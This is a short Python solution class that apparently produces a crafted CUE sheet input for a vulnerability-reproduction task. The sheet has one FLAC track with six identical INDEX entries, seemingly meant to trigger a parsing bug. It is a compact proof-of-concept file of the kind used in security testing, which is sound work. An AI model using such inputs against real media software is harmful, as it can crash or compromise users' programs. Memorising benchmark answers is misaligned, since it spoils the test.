class Solution:
    def solve(self, src_path: str) -> bytes:
        lines = [
            b'FILE "audio.flac" FLAC ',
            b'TRACK 01 AUDIO',
            b'  INDEX 01 00:00:00',
            b'  INDEX 02 00:00:00',
            b'  INDEX 03 00:00:00',
            b'  INDEX 04 00:00:00',
            b'  INDEX 05 00:00:00',
            b'  INDEX 06 00:00:00',
        ]
        return b'\n'.join(lines) + b'\n'